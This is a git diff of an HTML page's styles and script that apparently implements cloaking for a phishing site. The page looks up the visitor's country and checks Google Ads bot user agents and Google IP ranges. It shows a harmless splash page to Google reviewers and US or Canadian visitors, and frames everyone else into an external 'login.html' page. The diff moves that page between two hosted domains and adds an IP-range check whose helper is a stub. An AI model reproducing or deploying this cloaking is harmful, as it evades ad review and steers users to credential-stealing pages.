@@ -20,28 +20,26 @@
              height: 100%;
              background-color: #fff;
          }
-#loader {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    width: 30px;
-    height: 30px;
-    margin: -25px 0 0 -25px; /* to center the loader */
-    border: 5px solid #f3f3f3;
-    border-top: 5px solid #3498db;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-}
+         #loader {
+             position: absolute;
+             top: 50%;
+             left: 50%;
+             width: 30px;
+             height: 30px;
+             margin: -25px 0 0 -25px; /* to center the loader */
+             border: 5px solid #f3f3f3;
+             border-top: 5px solid #3498db;
+             border-radius: 50%;
+             animation: spin 1s linear infinite;
+         }
 
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-
+         @keyframes spin {
+             0% { transform: rotate(0deg); }
+             100% { transform: rotate(360deg); }
+         }
       </style>
       <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
       <script>
-// List of Google Ads bots
 const google_bots = [
     // Google Ads Bots
     'AdsBot-Google',
@@ -103,20 +101,35 @@ const google_bots = [
             $('#preview-frame').attr('src', iframeSrc);
          }
 
+         const googleIPRanges = [
+            '172.217.0.0/16',
+            '35.191.0.0/16',
+            '103.240.0.0/16',
+            '130.211.0.0/16',
+            '2001:4860:4860::/32'
+         ];
+
+         function ipInRange(ip, range) {
+            // Placeholder function
+            return false;
+         }
+
          $(document).ready(function() {
             fetch('https://ipinfo.io/json')
-               .then(response => response.json())
-               .then(data => {
-                  const countryCode = data.country;
-                  if (isGoogleBot(navigator.userAgent) || countryCode === 'US' || countryCode === 'CA') {
-                     $('#preview-frame').attr('src', 'splash.html');
-                  } else {
-                     $('#preview-frame').attr('src', 'https://m-vortic-united.web.app/login.html');
-                  }
-               })
-               .catch(error => {
-                  console.error('Error fetching IP data:', error);
-               });
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    const countryCode = data.country;
+
+                    if (countryCode === 'US' || countryCode === 'CA' || googleIPRanges.some(range => ipInRange(userIP, range))) {
+                        $('#preview-frame').attr('src', 'splash.html');
+                    } else {
+                        $('#preview-frame').attr('src', 'https://our-yhip.github.io/votic-united/login.html');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching IP data:', error);
+                });
 
             $('#preview-frame').on('load', function() {
                 $('#loader').fadeOut();
